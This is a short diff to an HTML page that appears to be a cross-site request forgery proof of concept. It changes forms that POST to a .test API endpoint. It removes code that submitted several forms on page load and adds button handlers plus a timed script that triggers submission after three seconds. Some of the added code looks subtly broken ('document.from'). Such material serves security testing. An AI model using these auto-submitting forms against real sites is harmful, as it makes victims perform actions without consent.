@@ -67,19 +67,28 @@
 
     <form id="csrf-form20" method='POST' action="https://tommy-design.test/api/weba/v3/site">
     </form>
+
+    <form id='newform' name='form' method="post">
+      <input type="button" value="添加" onclick="addAction()">
+      <input type="button" value="删除" onclick="deleteAction()">
+    </form>
  
-    <script>
-        var form1 = document.getElementById(`csrf-form1`)
-        var form2 = document.getElementById(`csrf-form2`)
-        var form3 = document.getElementById(`csrf-form3`)
-        form1.submit();
-        form2.submit();
-        form3.submit();
+    <script type='text/javascript'>
+        function addAction(){
+          document.from.action="https://tommy-design.test/api/weba/v3/site";
+          document.from.submit();
+        }
+        function deleteAction(){
+          document.from.action="https://tommy-design.test/api/weba/v3/site";
+          document.from.submit();
+        }
         // document.getElementById(`csrf-form2`).submit();
         // document.getElementById(`csrf-form3`).submit();
         // document.getElementById(`csrf-form4`).submit();
         // document.getElementById(`csrf-form5`).submit();
-      // setTimeout(submit_forms, 3000)
+      setTimeout(function(){
+        document.getElementById('newform').click()
+      }, 3000)
     </script>
   </body>
 
